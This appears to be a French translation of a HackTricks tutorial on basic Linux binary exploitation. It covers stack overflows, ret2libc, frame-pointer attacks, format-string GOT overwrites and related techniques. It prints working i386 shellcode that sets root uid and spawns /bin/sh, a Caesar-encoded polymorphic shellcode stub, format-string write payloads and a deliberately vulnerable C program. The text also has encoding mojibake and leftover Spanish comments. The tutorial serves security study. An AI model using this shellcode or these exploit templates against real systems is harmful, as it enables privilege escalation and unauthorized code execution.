# Linux Exploiting (Basique) (SPA)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

## **1.D√âBORDMENTS DE PILE**

> d√©bordement de tampon, d√©passement de tampon, d√©passement de pile, √©crasement de pile

Segmentation fault ou violation de segment: Lorsqu'une tentative est faite pour acc√©der √† une adresse m√©moire qui n'a pas √©t√© assign√©e au processus.

Pour obtenir l'adresse d'une fonction √† l'int√©rieur d'un programme, vous pouvez:
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### Appel √† sys\_execve

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2.SHELLCODE**

Voir les interruptions du noyau : cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; nettoyer eax\
xor ebx, ebx ; ebx = 0 car il n'y a pas d'argument √† passer\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Ex√©cuter l'appel syst√®me

**nasm -f elf assembly.asm** ‚Äî> Renvoie un fichier .o\
**ld assembly.o -o shellcodeout** ‚Äî> Donne un ex√©cutable compos√© du code assembleur et nous pouvons extraire les opcodes avec **objdump**\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Pour v√©rifier qu'il s'agit bien de notre shellcode et extraire les opcodes

**V√©rifier que le shellcode fonctionne**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
Pour v√©rifier que les appels syst√®me sont effectu√©s correctement, vous devez compiler le programme pr√©c√©dent et les appels syst√®me doivent appara√Ætre dans **strace ./PROGRAMA\_COMPILADO**

Lors de la cr√©ation de shellcodes, un tour peut √™tre effectu√©. La premi√®re instruction est un saut vers un appel. L'appel appelle le code original et place √©galement l'EIP dans la pile. Apr√®s l'instruction d'appel, nous avons ins√©r√© la cha√Æne dont nous avions besoin, de sorte qu'avec cet EIP nous pouvons pointer vers la cha√Æne et continuer √† ex√©cuter le code.

EJ **TRUCO (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**Utilisation de l'ESP avec le Shell(/bin/sh) :**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Chasseur d'≈ìufs :**

Il s'agit d'un petit code qui parcourt les pages de m√©moire associ√©es √† un processus √† la recherche de la shellcode qui y est stock√©e (recherche d'une signature sp√©cifique dans la shellcode). Utile dans les cas o√π il n'y a qu'un petit espace pour injecter du code.

**Shellcodes polymorphes**

Il s'agit de coquilles chiffr√©es qui contiennent de petits codes pour les d√©chiffrer et y sauter, en utilisant l'astuce Call-Pop, voici un **exemple de chiffrement C√©sar** :
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
1. **Attaquer le Frame Pointer (EBP)**

Utile dans une situation o√π nous pouvons modifier l'EBP mais pas l'EIP.

On sait qu'en sortant d'une fonction, le code assembleur suivant est ex√©cut√©:
```
movl               %ebp, %esp
popl                %ebp
ret
```
De cette fa√ßon, il est possible de modifier l'EBP en sortant d'une fonction (fvuln) qui a √©t√© appel√©e par une autre fonction, lorsque la fonction appelant fvuln se termine, son EIP peut √™tre modifi√©.

Dans fvuln, un EBP faux peut √™tre introduit pointant vers un emplacement o√π se trouve l'adresse de la shellcode + 4 (il faut ajouter 4 pour le pop). Ainsi, en sortant de la fonction, la valeur de &(\&Shellcode)+4 sera plac√©e dans ESP, avec le pop, 4 sera soustrait √† ESP et il pointera vers l'adresse de la shellcode lors de l'ex√©cution du ret.

**Exploit:**\
\&Shellcode + "AAAA" + SHELLCODE + padding + &(\&Shellcode)+4

**Exploit Off-by-One**\
Il est possible de modifier uniquement le byte le moins significatif de l'EBP. Une attaque similaire √† celle d√©crite pr√©c√©demment peut √™tre r√©alis√©e, mais la m√©moire contenant l'adresse de la shellcode doit partager les 3 premiers octets avec l'EBP.

## **4. M√©thodes return to Libc**

M√©thode utile lorsque la pile n'est pas ex√©cutable ou laisse un tampon tr√®s petit √† modifier.

L'ASLR fait en sorte que lors de chaque ex√©cution, les fonctions se chargent √† des emplacements diff√©rents en m√©moire. Par cons√©quent, cette m√©thode peut ne pas √™tre efficace dans ce cas. Pour les serveurs distants, comme le programme est constamment ex√©cut√© √† la m√™me adresse, cela peut √™tre utile.

* **cdecl (C declaration)** Place les arguments sur la pile et nettoie la pile apr√®s la sortie de la fonction
* **stdcall (standard call)** Place les arguments sur la pile et c'est la fonction appel√©e qui nettoie la pile
* **fastcall** Place les deux premiers arguments dans des registres et le reste sur la pile

On place l'adresse de l'instruction system de libc et on lui passe comme argument la cha√Æne "/bin/sh", g√©n√©ralement √† partir d'une variable d'environnement. De plus, on utilise l'adresse de la fonction exit pour que lorsque la shell ne sera plus n√©cessaire, le programme se termine sans probl√®me (et √©crit des journaux).

**export SHELL=/bin/sh**

Pour trouver les adresses dont nous aurons besoin, on peut regarder dans **GDB:**\
**p system**\
**p exit**\
**rabin2 -i executable** ‚Äî> Donne l'adresse de toutes les fonctions utilis√©es par le programme lors de son chargement\
(Dans un start ou un breakpoint): **x/500s $esp** ‚Äî> Nous recherchons ici la cha√Æne /bin/sh

Une fois que nous avons ces adresses, l'**exploit** serait le suivant :

‚ÄúA‚Äù \* DISTANCE EBP + 4 (EBP : peuvent √™tre 4 "A" bien que ce soit mieux si c'est le vrai EBP pour √©viter les erreurs de segmentation) + Adresse de **system** (√©crasera l'EIP) + Adresse de **exit** (√† la sortie de system(‚Äú/bin/sh‚Äù), cette fonction sera appel√©e car les 4 premiers octets de la pile sont trait√©s comme l'adresse suivante de l'EIP √† ex√©cuter) + Adresse de ‚Äú**/bin/sh**‚Äù (sera le param√®tre pass√© √† system)

Ainsi, l'EIP sera √©cras√© par l'adresse de system qui recevra la cha√Æne "/bin/sh" comme param√®tre et √† la sortie de celle-ci, la fonction exit() sera ex√©cut√©e.

Il est possible qu'un byte de l'adresse d'une fonction soit nul ou un espace (\x20). Dans ce cas, on peut d√©sassembler les adresses pr√©c√©dant cette fonction car il y a probablement plusieurs NOPs qui nous permettront d'en appeler un au lieu de la fonction directement (par exemple avec > x/8i system-4).

Cette m√©thode fonctionne car en appelant une fonction comme system en utilisant l'opcode **ret** au lieu de **call**, la fonction comprend que les 4 premiers octets seront l'adresse **EIP** vers laquelle revenir.

Une technique int√©ressante avec cette m√©thode est d'appeler **strncpy()** pour d√©placer une charge utile de la pile au tas et ensuite utiliser **gets()** pour ex√©cuter cette charge utile.

Une autre technique int√©ressante est l'utilisation de **mprotect()** qui permet d'attribuer les autorisations souhait√©es √† n'importe quelle partie de la m√©moire. Cela fonctionnait sur BDS, MacOS et OpenBSD, mais pas sur Linux (qui emp√™che d'attribuer simultan√©ment des autorisations d'√©criture et d'ex√©cution). Avec cette attaque, il serait possible de reconfigurer la pile comme ex√©cutable.

**Encha√Ænement de fonctions**

Bas√© sur la technique pr√©c√©dente, cette forme d'exploit consiste en :\
Remplissage + \&Fonction1 + \&pop;ret; + \&arg\_fun1 + \&Fonction2 + \&pop;ret; + \&arg\_fun2 + ‚Ä¶

De cette mani√®re, il est possible d'encha√Æner les fonctions √† appeler. De plus, si l'on souhaite utiliser des fonctions avec plusieurs arguments, on peut placer les arguments n√©cessaires (par exemple 4) et mettre les 4 arguments et rechercher une adresse contenant des opcodes : pop, pop, pop, pop, ret ‚Äî> **objdump -d executable**

**Encha√Ænement en falsifiant les trames (encha√Ænement des EBPs)**

Il s'agit de profiter de la capacit√© de manipuler l'EBP pour encha√Æner l'ex√©cution de plusieurs fonctions √† travers l'EBP et de "leave;ret"

REMPLISSAGE

* Placer dans l'EBP un EBP faux pointant vers : 2√®me EBP\_faux + la fonction √† ex√©cuter : (\&system() + \&leave;ret + &‚Äú/bin/sh‚Äù)
* Dans l'EIP, mettre comme adresse une fonction &(leave;ret)

On commence la shellcode avec l'adresse de la partie suivante de la shellcode, par exemple : 2√®meEBP\_faux + \&system() + &(leave;ret;) + &‚Äù/bin/sh‚Äù

le 2√®meEBP serait : 3√®meEBP\_faux + \&system() + &(leave;ret;) + &‚Äù/bin/ls‚Äù

Cette shellcode peut √™tre r√©p√©t√©e ind√©finiment dans les parties de m√©moire auxquelles on a acc√®s, de sorte qu'une shellcode facilement divisible en petits morceaux de m√©moire soit obtenue.

(L'ex√©cution de fonctions est encha√Æn√©e en m√©langeant les vuln√©rabilit√©s pr√©c√©demment vues d'EBP et de ret2lib)

## **5. M√©thodes compl√©mentaires**

**Ret2Ret**

Utile lorsque l'on ne peut pas placer une adresse de la pile dans l'EIP (on v√©rifie que l'EIP ne contient pas 0xbf) ou lorsque l'on ne peut pas calculer l'emplacement de la shellcode. Cependant, la fonction vuln√©rable accepte un param√®tre (la shellcode ira ici).

Ainsi, en changeant l'EIP par une adresse de **ret**, la prochaine adresse sera charg√©e (qui est l'adresse du premier argument de la fonction). Autrement dit, la shellcode sera charg√©e.

L'exploit serait : SHELLCODE + Remplissage (jusqu'√† l'EIP) + **\&ret** (les octets suivants de la pile pointent vers le d√©but de la shellcode car l'adresse du param√®tre pass√© est plac√©e sur la pile)

Apparemment, des fonctions comme **strncpy** une fois termin√©es suppriment de la pile l'adresse o√π la shellcode √©tait stock√©e, rendant cette technique impossible. Autrement dit, l'adresse pass√©e √† la fonction en tant qu'argument (celle qui stocke la shellcode) est modifi√©e par un 0x00, donc lors du deuxi√®me **ret**, un 0x00 est rencontr√© et le programme se termine.
```
**Ret2PopRet**
```
Si nous n'avons pas le contr√¥le sur le premier argument mais sur le deuxi√®me ou le troisi√®me, nous pouvons √©craser EIP avec une adresse de pop-ret ou pop-pop-ret, selon celle dont nous avons besoin.

**Technique de Murat**

Sur Linux, tous les programmes sont mapp√©s √† partir de 0xbfffffff.

En examinant comment la pile d'un nouveau processus est construite sur Linux, il est possible de d√©velopper un exploit de mani√®re √† ce que le programme soit lanc√© dans un environnement o√π la seule variable est la shellcode. L'adresse de celle-ci peut alors √™tre calcul√©e comme suit : addr = 0xbfffffff - 4 - strlen(NOM\_executable\_complet) - strlen(shellcode)

Cela permettrait d'obtenir facilement l'adresse o√π se trouve la variable d'environnement avec la shellcode.

Cela est possible gr√¢ce √† la fonction execle qui permet de cr√©er un environnement n'ayant que les variables d'environnement souhait√©es.

**Jump to ESP: Style Windows**

√âtant donn√© que ESP pointe toujours au d√©but de la pile, cette technique consiste √† remplacer EIP par l'adresse d'un appel √† **jmp esp** ou **call esp**. Ainsi, la shellcode est sauvegard√©e apr√®s l'√©crasement de l'EIP car apr√®s l'ex√©cution du **ret**, ESP pointera vers l'adresse suivante, juste l√† o√π la shellcode a √©t√© sauvegard√©e.

Si l'ASLR n'est pas activ√© sur Windows ou Linux, il est possible d'appeler **jmp esp** ou **call esp** stock√©s dans un objet partag√©. Si l'ASLR est activ√©, il pourrait √™tre n√©cessaire de rechercher √† l'int√©rieur du programme vuln√©rable lui-m√™me.

De plus, le fait de pouvoir placer la shellcode apr√®s la corruption de l'EIP plut√¥t qu'au milieu de la pile permet d'√©viter que les instructions push ou pop ex√©cut√©es au milieu de la fonction n'interf√®rent avec la shellcode (ce qui pourrait se produire si elle √©tait plac√©e au milieu de la pile de la fonction).

De mani√®re similaire √† cela, si nous savons qu'une fonction renvoie l'adresse o√π la shellcode est stock√©e, il est possible d'appeler **call eax** ou **jmp eax (ret2eax).**

**D√©bordements d'entiers**

Ce type de d√©bordements se produit lorsque une variable n'est pas pr√™te √† supporter un nombre aussi grand que celui qui lui est pass√©, peut-√™tre en raison d'une confusion entre les variables sign√©es et non sign√©es, par exemple:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
Dans l'exemple pr√©c√©dent, nous voyons que le programme attend 2 param√®tres. Le premier est la longueur de la cha√Æne suivante et le deuxi√®me est la cha√Æne.

Si nous passons un nombre n√©gatif comme premier param√®tre, il affichera que len < 256 et nous passerons ce filtre, et de plus strlen(buffer) sera inf√©rieur √† l, car l est un unsigned int et sera tr√®s grand.

Ce type de d√©bordements ne vise pas √† √©crire quelque chose dans le processus du programme, mais √† contourner des filtres mal con√ßus pour exploiter d'autres vuln√©rabilit√©s.

**Variables non initialis√©es**

On ne sait pas quelle valeur peut prendre une variable non initialis√©e et il pourrait √™tre int√©ressant de l'observer. Il se peut qu'elle prenne la valeur qu'une variable de la fonction pr√©c√©dente prenait et celle-ci soit contr√¥l√©e par l'attaquant.

## **Cha√Ænes de format**

En C, **`printf`** est une fonction qui peut √™tre utilis√©e pour **afficher** une cha√Æne. Le **premier param√®tre** que cette fonction attend est le **texte brut avec les formateurs**. Les **param√®tres suivants** attendus sont les **valeurs** √† **substituer** aux **formateurs** du texte brut.

La vuln√©rabilit√© appara√Æt lorsque le **texte de l'attaquant est mis en tant que premier argument** de cette fonction. L'attaquant pourra cr√©er une **entr√©e sp√©ciale en abusant** des **capacit√©s de la cha√Æne de format printf** pour **√©crire n'importe quelle donn√©e √† n'importe quelle adresse**. De cette mani√®re, il peut **ex√©cuter du code arbitraire**.

Formateurs:
```bash
%08x ‚Äî> 8 hex bytes
%d ‚Äî> Entire
%u ‚Äî> Unsigned
%s ‚Äî> String
%n ‚Äî> Number of written bytes
%hn ‚Äî> Occupies 2 bytes instead of 4
<n>$X ‚Äî> Direct access, Example: ("%3$d", var1, var2, var3) ‚Äî> Access to var3
```
**`%n`** **√©crit** le **nombre d'octets √©crits** √† l'**adresse indiqu√©e. √âcrire** autant **d'octets** que le nombre hexad√©cimal dont nous **avons besoin** d'√©crire est comment vous pouvez **√©crire n'importe quelle donn√©e**.
```bash
AAAA%.6000d%4\$n ‚Äî> Write 6004 in the address indicated by the 4¬∫ param
AAAA.%500\$08x ‚Äî> Param at offset 500
```
### GOT (Global Offsets Table) / PLT (Procedure Linkage Table)

C'est la table qui contient l'**adresse** des **fonctions externes** utilis√©es par le programme.

Obtenez l'adresse de cette table avec : **`objdump -s -j .got ./exec`**

![](<../../.gitbook/assets/image (619).png>)

Observez comment apr√®s le **chargement** de l'**ex√©cutable** dans GEF, vous pouvez **voir** les **fonctions** qui se trouvent dans le **GOT** : `gef‚û§ x/20x 0xDIR_GOT`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (5).png>)

En utilisant GEF, vous pouvez **d√©marrer** une **session de d√©bogage** et ex√©cuter **`got`** pour voir la table got :

![](<../../.gitbook/assets/image (621).png>)

Dans un binaire, le GOT contient les **adresses des fonctions ou** de la section **PLT** qui chargera l'adresse de la fonction. L'objectif de cette exploitation est de **remplacer l'entr√©e du GOT** d'une fonction qui sera ex√©cut√©e plus tard **avec** l'**adresse** du PLT de la fonction **`system`**. Id√©alement, vous **remplacerez** le **GOT** d'une **fonction** qui **sera appel√©e avec des param√®tres contr√¥l√©s par vous** (vous pourrez ainsi contr√¥ler les param√®tres envoy√©s √† la fonction syst√®me).

Si **`system`** **n'est pas utilis√©** par le script, la fonction syst√®me **n'aura pas d'entr√©e** dans le GOT. Dans ce sc√©nario, vous devrez **d'abord divulguer l'adresse** de la fonction `system`.

La **Procedure Linkage Table** est une table **en lecture seule** dans le fichier ELF qui stocke tous les **symboles n√©cessitant une r√©solution**. Lorsqu'une de ces fonctions est appel√©e, le **GOT** **redirigera** le **flux** vers le **PLT** pour qu'il puisse **r√©soudre** l'**adresse** de la fonction et l'√©crire dans le GOT. Ensuite, la **prochaine fois** qu'un appel est effectu√© √† cette adresse, la **fonction** est **appel√©e directement** sans avoir besoin de la r√©soudre.

Vous pouvez voir les adresses PLT avec **`objdump -j .plt -d ./vuln_binary`**

### **Flux d'exploitation**

Comme expliqu√© pr√©c√©demment, l'objectif sera de **remplacer** l'**adresse** d'une **fonction** dans la table **GOT** qui sera appel√©e plus tard. Id√©alement, nous pourrions d√©finir l'**adresse d'un shellcode** situ√© dans une section ex√©cutable, mais il est tr√®s probable que vous ne puissiez pas √©crire un shellcode dans une section ex√©cutable.\
Une option diff√©rente est donc de **remplacer** une **fonction** qui **re√ßoit** ses **arguments** de l'**utilisateur** et de la **rediriger** vers la **fonction** **`system`**.

Pour √©crire l'adresse, g√©n√©ralement 2 √©tapes sont effectu√©es : Vous **√©crivez d'abord 2 octets** de l'adresse, puis les 2 autres. Pour ce faire, on utilise **`$hn`**.

**HOB** est appel√© pour les 2 octets les plus √©lev√©s de l'adresse\
**LOB** est appel√© pour les 2 octets les plus bas de l'adresse

Ainsi, en raison du fonctionnement de la cha√Æne de format, vous devez **√©crire d'abord le plus petit** des \[HOB, LOB] puis l'autre.

Si HOB < LOB\
`[adresse+2][adresse]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

Si HOB > LOB\
`[adresse+2][adresse]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 N¬∫Param\_dir\_HOB LOB\_shell-HOB\_shell N¬∫Param\_dir\_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

### **Mod√®le d'exploitation de la cha√Æne de format**

Vous pouvez trouver un **mod√®le** pour exploiter le GOT en utilisant des cha√Ænes de format ici :

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### **.fini\_array**

Essentiellement, il s'agit d'une structure avec des **fonctions qui seront appel√©es** avant que le programme ne se termine. C'est int√©ressant si vous pouvez appeler votre **shellcode en sautant √† une adresse**, ou dans les cas o√π vous devez revenir √† main pour **exploiter √† nouveau la cha√Æne de format**.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
Notez que cela **ne** **cr√©era pas** de **boucle infinie** car lorsque vous revenez √† la fonction principale, le canari le remarquera, la fin de la pile pourrait √™tre corrompue et la fonction ne sera pas rappel√©e. Ainsi, avec cela, vous pourrez **avoir 1 ex√©cution suppl√©mentaire** de la vuln√©rabilit√©.

### **Formatage des cha√Ænes pour extraire du contenu**

Une cha√Æne de format peut √©galement √™tre exploit√©e pour **extraire du contenu** de la m√©moire du programme.\
Par exemple, dans la situation suivante, il y a une **variable locale dans la pile pointant vers un drapeau**. Si vous **trouvez** o√π en **m√©moire** se trouve le **pointeur** vers le **drapeau**, vous pouvez faire en sorte que **printf acc√®de** √† cette **adresse** et **affiche** le **drapeau** :

Ainsi, le drapeau est √† **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

Et √† partir de la fuite, vous pouvez voir que le **pointeur vers le drapeau** est dans le **8e** param√®tre :

![](<../../.gitbook/assets/image (623).png>)

Donc, en **acc√©dant** au **8e param√®tre**, vous pouvez obtenir le drapeau :

![](<../../.gitbook/assets/image (624).png>)

Notez qu'en suivant l'**exploit pr√©c√©dent** et en r√©alisant que vous pouvez **extraire du contenu**, vous pouvez **d√©finir des pointeurs** vers **`printf`** dans la section o√π l'**ex√©cutable** est **charg√©** et le **dumper** **enti√®rement** !

### **DTOR**

{% hint style="danger" %}
De nos jours, il est tr√®s **rare de trouver un binaire avec une section dtor**.
{% endhint %}

Les destructeurs sont des fonctions qui sont **ex√©cut√©es avant la fin du programme**.\
Si vous parvenez √† **√©crire** une **adresse** vers un **shellcode** dans **`__DTOR_END__`**, cela sera **ex√©cut√©** avant la fin des programmes.\
Obtenez l'adresse de cette section avec :
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep ‚Äú__DTOR‚Äù
```
D'habitude, vous trouverez la section **DTOR** **entre** les valeurs `ffffffff` et `00000000`. Donc, si vous voyez juste ces valeurs, cela signifie qu'**aucune fonction n'est enregistr√©e**. Donc, **√©crasez** le **`00000000`** avec l'**adresse** du **shellcode** pour l'ex√©cuter.

### **Cha√Ænes de format pour les d√©bordements de tampon**

La fonction **sprintf** d√©place une cha√Æne format√©e **vers** une **variable**. Par cons√©quent, vous pourriez abuser du **formatage** d'une cha√Æne pour provoquer un **d√©bordement de tampon dans la variable** o√π le contenu est copi√©.\
Par exemple, la charge utile `%.44xAAAA` √©crira **44B+"AAAA" dans la variable**, ce qui peut provoquer un d√©bordement de tampon.

### **Structures \_\_atexit**

{% hint style="danger" %}
De nos jours, il est tr√®s **√©trange d'exploiter cela**.
{% endhint %}

**`atexit()`** est une fonction √† laquelle **d'autres fonctions sont pass√©es en tant que param√®tres.** Ces **fonctions** seront **ex√©cut√©es** lors de l'ex√©cution d'un **`exit()`** ou du **retour** du **main**.\
Si vous pouvez **modifier** l'**adresse** de l'une de ces **fonctions** pour pointer vers un shellcode par exemple, vous **prendrez le contr√¥le** du **processus**, mais c'est actuellement plus compliqu√©.\
Actuellement, les **adresses des fonctions** √† ex√©cuter sont **cach√©es** derri√®re plusieurs structures et finalement l'adresse vers laquelle elles pointent n'est pas l'adresse des fonctions, mais est **crypt√©e avec XOR** et des d√©calages avec une **cl√© al√©atoire**. Ainsi, ce vecteur d'attaque n'est actuellement **pas tr√®s utile au moins sur x86** et **x64\_86**.\
La **fonction de cryptage** est **`PTR_MANGLE`**. D'autres architectures telles que m68k, mips32, mips64, aarch64, arm, hppa... **n'impl√©mentent pas la fonction de cryptage** car elle **renvoie la m√™me chose** qu'elle a re√ßue en entr√©e. Ainsi, ces architectures pourraient √™tre attaqu√©es par ce vecteur.

### **setjmp() & longjmp()**

{% hint style="danger" %}
De nos jours, il est tr√®s **√©trange d'exploiter cela**.
{% endhint %}

**`Setjmp()`** permet de **sauvegarder** le **contexte** (les registres)\
**`longjmp()`** permet de **restaurer** le **contexte**.\
Les **registres sauvegard√©s** sont : `EBX, ESI, EDI, ESP, EIP, EBP`\
Ce qui se passe est que EIP et ESP sont pass√©s par la fonction **`PTR_MANGLE`**, donc les **architectures vuln√©rables √† cette attaque sont les m√™mes que ci-dessus**.\
Ils sont utiles pour la r√©cup√©ration d'erreurs ou les interruptions.\
Cependant, d'apr√®s ce que j'ai lu, les autres registres ne sont pas prot√©g√©s, **donc s'il y a un `call ebx`, `call esi` ou `call edi`** √† l'int√©rieur de la fonction appel√©e, le contr√¥le peut √™tre pris. Ou vous pourriez √©galement modifier EBP pour modifier ESP.

**VTable et VPTR en C++**

Chaque classe a une **table V** qui est un tableau de **pointeurs vers des m√©thodes**.

Chaque objet d'une **classe** a un **VPtr** qui est un **pointeur** vers le tableau de sa classe. Le VPtr fait partie de l'en-t√™te de chaque objet, donc si une **modification** du **VPtr** est r√©alis√©e, il pourrait √™tre **modifi√©** pour **pointer** vers une m√©thode factice de sorte que l'ex√©cution d'une fonction aille vers le shellcode.

## **Mesures pr√©ventives et √©vasions**

**Retour dans printf**

C'est une technique pour transformer un d√©bordement de tampon en une erreur de cha√Æne de format. Il consiste √† remplacer l'EIP pour qu'il pointe vers un printf de la fonction et √† lui passer une cha√Æne de format manipul√©e pour obtenir des valeurs sur l'√©tat du processus.

**Attaque sur les biblioth√®ques**

Les biblioth√®ques sont positionn√©es avec 16 bits d'al√©atoire = 65636 adresses possibles. Si un serveur vuln√©rable appelle fork(), l'espace d'adressage m√©moire est clon√© dans le processus enfant et reste intact. Ainsi, il est possible d'essayer de forcer la fonction usleep() de libc en lui passant l'argument "16" de sorte que si elle met plus de temps que d'habitude √† r√©pondre, la fonction sera trouv√©e. En connaissant l'emplacement de cette fonction, il est possible d'obtenir delta\_mmap et de calculer les autres.

La seule fa√ßon d'√™tre s√ªr que l'ASLR fonctionne est d'utiliser une architecture 64 bits. Il n'y a pas d'attaques par force brute.

### Relro

**Relro (Read only Relocation)** affecte les autorisations de m√©moire de mani√®re similaire √† NX. La diff√©rence est que tandis qu'avec NX, cela rend la pile ex√©cutable, RELRO rend **certaines choses en lecture seule** donc nous **ne pouvons pas √©crire** dessus. La mani√®re la plus courante que j'ai vue pour que cela soit un obstacle est de nous emp√™cher de faire un **√©crasement de table `got`**, qui sera abord√© plus tard. La table `got` contient les adresses des fonctions libc afin que le binaire sache quelles sont les adresses et puisse les appeler. Voyons √† quoi ressemblent les autorisations de m√©moire pour une entr√©e de table `got` pour un binaire avec et sans relro.

Avec relro:
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
